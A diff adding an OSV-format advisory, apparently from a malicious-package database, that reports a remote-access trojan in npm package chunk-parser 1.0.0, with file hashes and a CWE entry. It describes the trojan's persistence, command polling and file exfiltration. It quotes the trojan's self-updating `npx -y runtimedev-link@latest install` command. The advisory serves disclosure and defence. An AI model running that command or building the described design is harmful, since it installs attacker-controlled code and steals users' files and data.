@@ -1,0 +1,95 @@
+{
+  "modified": "2026-07-09T15:55:10Z",
+  "published": "2026-07-09T15:55:10Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-10057",
+  "summary": "Malicious code in chunk-parser (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (8ffcc87316488b883c382ff45dd16c0bccb3cba432351f0716f239f81be79017)\nThe package advertises itself as a 'Pure Node.js chunk parser platform' but its shipped code is a full remote-access trojan under internal identifiers 'runtimedev-link'. lib/portable_runtime.js downloads a portable Node.js 22.22.0 runtime from nodejs.org into ~/.local/share/runtimedev-link/runtime/ and uses it to run a bundled agent CLI out-of-band from the developer's system Node. The agent installs cross-platform boot persistence: a Linux systemd --user unit (with cron @reboot and ~/.config/autostart fallbacks), a macOS LaunchAgent plist (Label com.runtimedev.link, RunAtLoad+KeepAlive) at ~/Library/LaunchAgents/com.runtimedev.link.plist, and a hidden Windows Task Scheduler task 'runtimedev-link' driven by a VBS launcher. Once persisted, commandLoop polls an operator-controlled API base (SSTAR_API_BASE / NODE_LINK_API_BASE) at /api/telemetry/poll-command, executes tasked shell commands via child_process, and returns stdout/stderr to /api/telemetry/command-result. download.js handleDownloadRequest zips any operator-named filesystem path (up to 50MB) and uploads it base64-encoded to /api/telemetry/upload-download, giving the operator arbitrary file exfiltration. postTelemetryReport continuously ships hostname, username, OS info, public IP (fetched from api.ipify.org), a walked directory tree of the user's home, and a Chrome/Edge/Brave/Chromium extensions inventory (enumerated from each browser's User Data profile) to /api/telemetry/report. All persistence launchers re-invoke `npx -y runtimedev-link@latest install --token \u003ctoken\u003e` at every logon/boot, giving the operator a live, unpinned auto-update channel that pulls whatever runtimedev-link@latest becomes on each persisted host.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "chunk-parser"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "lib/transport.js",
+              "sha256": "f38f6533797ae59b428b8b383010145b6b6015bbe9473d493ed270db78fb3419",
+              "tlsh": "bc4286ca34f7351946a3b4a4962b51177616e203380fcce4b65c47106faa1386ab6fdf"
+            },
+            {
+              "path": "lib/portable_runtime.js",
+              "sha256": "07dc30e8712b2493086fecd75421a025cb79b13d76291b300ca650557dba9df8",
+              "tlsh": "4cd1438a1af762344672d2a63e0fd44db297c40b224bdd94fb9c46c83f81538b5925de"
+            },
+            {
+              "path": "lib/persistence.js",
+              "sha256": "ce98781e79a62ad33b34545c6bc83bb0298da9add3d88ee117b6c6cd7b062e4a",
+              "tlsh": "1f62c3dabdf3b1384af6a624164f942964edd243290eddb0f8ec01905f9a66c4273ddc"
+            },
+            {
+              "path": "lib/chrome_extensions.js",
+              "sha256": "526d2f818355199aadf6a576c649879697bc381dce087d72f9d7ac9e373a5062",
+              "tlsh": "b4d1324a18ff202a0577d1689f5f6002b7699093344bfd947bec87443f9262c93f6aac"
+            },
+            {
+              "path": "lib/download.js",
+              "sha256": "c4a0d30d7f2fa3ee910281a5ae42ad35ada861e97267209e8b90b97bea3ea469",
+              "tlsh": "f241e4cb3ae57119812572988d5f9233b296d043382cdee1f6ac07d03f5459458f2ac5"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "chunk-parser-1.0.0.tgz",
+              "hashes": {
+                "sha1": "1d5172dcfacd7378b30a8e1d1923a8d55609d197",
+                "sha512_sri": "sha512-1H1eG0O3Vxx1hXtKmNVHZN0TSERO7m+7DIvKnet9p3KIv4wfU2pWk2QKeSfFvbBTKydE9EfrEY24l9+ENoDZLQ=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/chunk-parser/v/1.0.0"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-009284",
+        "import_time": "2026-07-09T16:20:57.322395392Z",
+        "modified_time": "2026-07-09T15:55:10Z",
+        "sha256": "8ffcc87316488b883c382ff45dd16c0bccb3cba432351f0716f239f81be79017",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
+      }
+    ]
+  }
+}
